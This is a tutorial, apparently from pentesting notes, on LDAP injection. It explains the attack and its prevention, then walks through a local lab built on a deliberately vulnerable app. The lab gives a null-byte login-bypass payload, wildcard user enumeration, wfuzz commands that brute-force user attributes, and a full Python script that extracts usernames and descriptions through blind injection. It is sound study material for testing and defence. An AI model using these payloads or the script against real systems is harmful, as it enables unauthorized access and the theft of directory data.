**LDAP (Lightweight Directory Protocol)** injections are a type of attack that exploits vulnerabilities in web applications that interact with an LDAP server. The LDAP server is a directory used to store user and resource information on a network.

LDAP injection works by inserting malicious LDAP commands into the input fields of a web application, which are then sent to the LDAP server for processing. If the web application is not properly designed to handle user input, an attacker can exploit this weakness to perform unauthorized operations on the LDAP server.

Like SQL and NoSQL injections, LDAP injections can be very dangerous. Some examples of what an attacker could accomplish through an LDAP injection include:
- Accessing user or resource information that you should not have access to.
- Making unauthorized changes to the LDAP server database, such as adding or deleting users or resources.
- Performing malicious operations on the network, such as launching phishing attacks or installing malicious software on network systems.

To prevent LDAP injections, web applications that interact with an LDAP server must properly validate and clean up user input before sending it to the LDAP server. This includes validating the syntax of input fields, removing special characters, and limiting the commands that can be executed on the LDAP server.

It is also important that web applications are run with minimum privileges on the network and that LDAP server activities are regularly monitored for possible injections.

# Example

For the realization of this example we are going to download the following *Github* repository: [LDAP-Injection-Vuln-App](https://github.com/motikan2010/LDAP-Injection-Vuln-App). Then we have to execute the following commands to deploy the containers:

```bash
docker run -p 389:389 --name openldap-container --detach osixia/openldap:1.2.2
docker build -t ldap-client-container .
docker run -dit --link openldap-container -p 8888:80 ldap-client-container
```

----
> Caution: if you get an error after the *docker build* command, you must edit the *Dockerfile* and include *8.0* in the **PHP** version.
----

To search within an *LDAP* server based on certain parameters we can use the **ldapsearch** tool:

```bash
# cn (common name): this refers to the individual object (person's name; meeting room; recipe name; job title; etc.) for whom/which you are querying
# dc (domain component): this refers to each component of the domain. For example www.mydomain.com would be written as DC=www,DC=mydomain,DC=com
# ou (organizational unit): this refers to the organizational unit (or sometimes the user group) that the user is part of. If the user is part of more than one group, you may specify as such, e.g., OU= Lawyer,OU= Judge
# dn (distinguised name): this refers to the name that uniquely identifies an entry in the directory
# -x: simple authentication (user and password)
# -H: specify URI(s) referring to the ldap server(s)
# -b: use searchbase as the starting point for the search instead of the default
# -D: use the dn to bind to the LDAP directory
# -w: use password for simple authentication
# The final string is the query we want to run
ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin '(&(cn=admin)(description=LDAP Administrator))'
```

The **nmap** tool contains scripts for *LDAP*. They can be found as follows:

```bash
locate .nse | grep ldap
```

We can launch a scan with **nmap** by running all the *LDAP* scripts it has:

```bash
# Run all nmap scripts containing or starting with ldap
nmap --script ldap\* -p 389 localhost
```

In the results we can see the *dc* 'example' and 'org'.

We can play with \* to autocomplete fields in case they are not sanitized:

```bash
# In this case you will find the description starting with LDAP as the user admin
ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin '(&(cn=admin)(description=LDAP*))'
```

Queries can be more complex:

```bash
# In this case we say that either the cnd is admin and (&) the description starts with LDAP or (|) the cn is admin and the telephoneNumber is 6666666666666
ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin '(|(&(cn=admin)(description=LDAP*))(&(cn=admin)(telephoneNumber=666666666)))'
```

If we check the request that we send to log in we see that as data, it includes the following:

```
user_id=admin&password=admin&login=1&submit=Submit
```

We can log in and get the session cookie if we close the query by commenting out the end with a null byte to ignore the password, which would make it possible to log in knowing only the user:

```shell
# This is the same...
user_id=admin))%00&password=testing&login=1&submit=Submit

# ... like this
(&(cn=admin))%00)(userPassword=testing))
```

Therefore, as in the case of [[NoSQL Injections]], we have a potential way to enumerate users with the \*:

```shell
# This will give us the code 301 (redirection) which in this case indicates that the login is correct and therefore, the user begins with the indicated letters (admin is the user we want)
user_id=a*&password=*&login=1&submit=Submit
user_id=ad*&password=*&login=1&submit=Submit
user_id=adm*&password=*&login=1&submit=Submit

# This will give us the code 200 (redirection) which in this case indicates that the login is incorrect and therefore, the user does not beggins with ar (admin is the user we want)
user_id=ar*&password=*&login=1&submit=Submit
```

Earlier we saw that the *admin* user had the *description* attribute, but users can have more attributes. We are going to enter the container with *docker exec -it openldap-container bash* command and we are going to add a series of new users. Inside the container we go to the */container/service/slapd/assets/test*  path and read the *file new-user.ldif*. We are going to create three new users (in our local machine) based on this structure:

```bash
# newuser1.ldif
dn: uid=loki,dc=example,dc=org
uid: loki
cn: loki
sn: 3
objectClass: top
objectClass: posixAccount
objectClass: inetOrgPerson
loginShell: /bin/bash
homeDirectory: /home/loki
uidNumber: 14583102
gidNumber: 14564100
userPassword: loki123
mail: loki@example.org
description: This is a sample description of the user Loki
telephoneNumber: 666345222
```

```bash
# newuser2.ldif
dn: uid=muffin,dc=example,dc=org
uid: muffin
cn: muffin
sn: 3
objectClass: top
objectClass: posixAccount
objectClass: inetOrgPerson
loginShell: /bin/bash
homeDirectory: /home/muffin
uidNumber: 14583102
gidNumber: 14564100
userPassword: muffin123
mail: muffin@example.org
description: This is a sample description of the user Muffin
telephoneNumber: 644227101
```

```bash
# newuser3.ldif
dn: uid=john,dc=example,dc=org
uid: john
cn: john
sn: 3
objectClass: top
objectClass: posixAccount
objectClass: inetOrgPerson
loginShell: /bin/bash
homeDirectory: /home/john
uidNumber: 14583102
gidNumber: 14564100
userPassword: john123
mail: john@example.org
description: This is a sample description of the user John
telephoneNumber: 666345222
```

To add new users we can use the **ldapadd** tool together with the *.ldif* files we created earlier:

```bash
ldapadd -x -H ldap://localhost -D "cn=admin,dc=example,dc=org" -w admin -f newuser1.ldif
ldapadd -x -H ldap://localhost -D "cn=admin,dc=example,dc=org" -w admin -f newuser2.ldif
ldapadd -x -H ldap://localhost -D "cn=admin,dc=example,dc=org" -w admin -f newuser3.ldif
```

We can discover user attributes with the **wfuzz** tool. In this case we are going to discover the attributes of the user *loki* by hiding the answers that are *500* characters long, which in this case are invalid:

```bash
wfuzz -c --hh=550 -w /usr/share/seclists/Fuzzing/LDAP-openldap-attributes.txt -d 'user_id=loki)(FUZZ=*))%00&password=*&login=1&submit=Submit' http://localhost:8888
```

We can also apply a *range* to discover the *telephoneNumber* field number by number:

```bash
wfuzz -c --hh=550 -z range,0-9 -d 'user_id=loki)(telephoneNumber=FUZZ*))%00&password=*&login=1&submit=Submit' http://localhost:8888
wfuzz -c --hh=550 -z range,0-9 -d 'user_id=loki)(telephoneNumber=6FUZZ*))%00&password=*&login=1&submit=Submit' http://localhost:8888
wfuzz -c --hh=550 -z range,0-9 -d 'user_id=loki)(telephoneNumber=66FUZZ*))%00&password=*&login=1&submit=Submit' http://localhost:8888
wfuzz -c --hh=550 -z range,0-9 -d 'user_id=loki)(telephoneNumber=666FUZZ*))%00&password=*&login=1&submit=Submit' http://localhost:8888
wfuzz -c --hh=550 -z range,0-9 -d 'user_id=loki)(telephoneNumber=6663FUZZ*))%00&password=*&login=1&submit=Submit' http://localhost:8888
```

By using the appropriate dictionary we can thus discover all attribute fields.

Now we are going to use this logic to create a **Python** script that discovers us:
- The first letter of each user
- Using the first letter of each user, we get the full names of all users
- Using the full names of the users, we are going to get an attribute of theirs (in this case the *description* field)

```python
#!/usr/bin/python3

import requests
import time
import sys
import signal

from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Global variables
main_url = "http://localhost:8888"
# burp = {'http':'http://127.0.0.1:8080'}

def getInitialUsers():
    characters = string.ascii_lowercase
    initial_users = []
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    for character in characters:
        post_data = "user_id={}*&password=*&login=1&submit=Submit".format(character)
        # By default Python shows you the final code after the redirect, to prevent it from doing the redirect we add 'allow_redirects=False'
        r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)
        # We can pass the petition through BurpSuite proxy
        # r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False, proxies=burp)

        if r.status_code == 301:
            initial_users.append(character)

    return initial_users

def getUsers(initial_users):
    characters = string.ascii_lowercase + string.digits
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    valid_users = []

    for first_character in initial_users:
        user = ""
    
        for position in range(0, 15):
            for character in characters:
                post_data = "user_id={}{}{}*&password=*&login=1&submit=Submit".format(first_character, user, character)

                r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)
                
                if r.status_code == 301:
                    user += character
                    break

        valid_users.append(first_character + user)

    print("\n")

    for user in valid_users:
        log.info("Valid user found: %s" % user)

    print("\n")

    return valid_users

def getDescription(user):
    characters = string.ascii_lowercase + ' '
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    description = ""

    p1 = log. progress("Brute-force")
    p1.status("Starting brute-force process..")

    time.sleep(2)

    p2 = log.progress("Description")

    for position in range(0, 50):
        for character in characters:
            post_data = "user_id={}) (description={}{}*) )%00&password=*&login=1&submit=Submit".format(user, description, character)

            r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)

            if r.status_code == 301:
                description += character
                p2.status(description)
                break

    p1.success("Brute-force process ended")
    p2.success("User's description is: %s" % description)

if __name__ == '__main__':
    initial_users = getInitialUsers()
    valid_users = getUsers(initial_users)

    for i in range(0, len(valid_users)):
        getDescription(valid_users[i])
```

This is an example of how we could enumerate users and their attributes with **Python**.